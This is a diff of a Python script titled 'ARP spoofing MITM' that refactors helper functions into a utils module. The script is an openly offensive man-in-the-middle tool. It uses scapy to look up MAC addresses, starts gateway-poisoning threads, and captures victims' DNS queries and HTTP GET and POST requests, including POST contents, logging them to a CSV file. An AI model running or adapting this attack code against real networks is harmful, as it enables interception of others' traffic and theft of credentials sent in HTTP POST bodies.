@@ -5,12 +5,13 @@ import threading
 import os
 import sys
 from datetime import datetime
+import utils
 
 # gets mac address from ip
 def get_MACaddress(ip) :
 	pack = Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip, hwdst = "ff:ff:ff:ff:ff:ff")
 	resp = srp1(pack, verbose = 0, timeout = 2)
-	if resp : 
+	if resp :
 		return resp.hwsrc
 	else : 
 		return None
@@ -95,12 +96,13 @@ def dns_sniff_request(pkt) :
 			") is resolving " +
 			pkt.getlayer(DNS).qd.qname)
 		if not SAVE_FILE_PATH == "" :
-			save_to_csv_file(
+			utils.save_to_csv_file(
 				[
 					date,pkt.getlayer(IP).src,pkt.getlayer(Ether).src,
 					"DNS request",
 					pkt.getlayer(DNS).qd.qname
-				]
+				],
+				SAVE_FILE_PATH
 				)
 
 
@@ -145,20 +147,21 @@ def http_sniff_get_request(pkt) :
 					host_request +
 					get_request)
 				if not SAVE_FILE_PATH == "" :
-					save_to_csv_file(
+					utils.save_to_csv_file(
 						[
 							date,pkt.getlayer(IP).src,
 							pkt.getlayer(Ether).src,
 							"HTTP_GET request",
 							host_request + get_request
-						]
+						],
+						SAVE_FILE_PATH
 						)
 		except IndexError : 
 			return
 
 # captures, displays and eventually saves http POST requests
 def http_sniff_post_request(pkt) :
-	if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport==80 :
+	if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 :
 		try :
 			# getting GET request and Host header
 			raw_content = str(pkt.getlayer(TCP))
@@ -206,7 +209,7 @@ def http_sniff_post_request(pkt) :
 					post_content
 					)
 				if not SAVE_FILE_PATH == "" :
-					save_to_csv_file(
+					utils.save_to_csv_file(
 						[
 							date,pkt.getlayer(IP).src,
 							pkt.getlayer(Ether).src,
@@ -218,40 +221,14 @@ def http_sniff_post_request(pkt) :
 								" Content:" +
 								post_content
 							)
-						]
+						],
+						SAVE_FILE_PATH
 						)
 		except IndexError :
 			return
 
-# saves an array of strings to the file in SAVE_FILE_PATH by appending a the array as a comma separated values line
-def save_to_csv_file(elements) :
-	CSV_SEPARATOR = ';'
-	out_file = open(SAVE_FILE_PATH, "a")
-	cs = ""
-	for index, el in enumerate(elements) :
-		if index == len(elements) - 1 :
-			cs += el
-		else :
-			cs += el + CSV_SEPARATOR
-	out_file.write(cs + "\n")
-
-# prints to screen an array of strings by surrounding them in a frame
-def program_header(elements) :
-	elements.insert(len(elements),"")
-	elements.insert(0,"")
-	longest = 0
-	sep = '#'
-	for elm in elements : 
-		if len(elm) > longest :
-			longest = len(elm)
-	print(sep * (longest + 4))
-	for elm in elements :
-		print(sep + " " + elm + " " * (longest - len(elm)) + " " + sep)
-	print(sep * (longest + 4))
-
-
 # presentation
-program_header([
+utils.program_header([
 	"ARP spoofing MITM",
 	"Version: 0.3",
 	"Author: Carlo Cervellin"
@@ -398,4 +375,5 @@ while True :
 	gwthread.append(gwpoison)
 	gwpoison.start()
 
-	if ATTACK_TYPE == ATTACK_TYPE_SNIFF : sniff_request()
+	if ATTACK_TYPE == ATTACK_TYPE_SNIFF :
+		sniff_request()
